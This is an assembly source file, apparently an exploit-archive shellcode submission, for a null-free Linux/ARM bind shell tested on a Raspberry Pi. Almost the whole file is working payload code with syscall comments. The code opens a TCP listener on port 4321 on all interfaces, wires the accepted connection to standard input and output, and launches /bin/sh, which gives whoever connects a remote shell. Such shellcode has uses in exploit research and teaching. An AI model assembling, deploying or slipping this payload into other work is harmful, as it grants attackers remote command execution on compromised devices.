/*
* Title:  Linux/ARM - Bind_Shell Shellcode TCP (/bin/sh). Null free shellcode 0.0.0.0:4321 (84 bytes)
*Author: Gokul Babu-https://www.linkedin.com/in/gokul-babu-452b3b112/
* Tested: armv7l (Raspberry Pi b3+)
* Date:   2019-01-28
*/

/*socket-281, domain=2,type=1,protocol=0*/
/*bind-282 sockfd=final result of socket,&addr=struct,adrlen=16*/
/*listen-284,sockfd=id value-r4,backlog=1/2*/
/*accept-285,sockfd=id,&addr=0,addrlen=0*/
/*dup2-63,sockfd=final result of accept r4<-r0=4,newfd=0,1,2*/
/*execve-11,execv="/bin/sh",0,0*/

.section .text
.global _start
_start:
.ARM
	add r3,pc,#1
	bx r3
.THUMB
//socket:
	mov r0,#2
	mov r1,#1
	mov r7,#200
	add r7,#81
	svc #1
	mov r4,r0
	push {r0,r1,r2} /*r0=3,r1=1,r2=0*/
//bind:
	adr r1,struct
	strb r2,[r1,#1]
	str r2,[r1,#4] /*store r2=0 in IP*/
	mov r2,#16
	add r7,#1
	svc #1
//listen:
	pop {r0,r1,r2} /*r0=3,r1=1,r2=0*/
	add r7,#2
	svc #1
//accept:
	mov r0,r4
	sub r1,r1
	add r7,#1
	svc #1
	add r0,r0,r2 /*r0=4,r2=0*/
//dup2:
//dup(4,2)
	mov r7,#63
//dup(4,1)
	mov r1,#1
	svc #1
//dup(4,0)
	sub r1,#1
	svc #1
//execve:
	adr r0,exc
	strb r2,[r0,#7]
	mov r7,#11
	svc #1
exc:
        .ascii "/bin/shX"
struct:
	.ascii "\x02\xff"
	.ascii "\x10\xE1" //port 4321
	.byte  1,1,1,1 //IP-0.0.0.0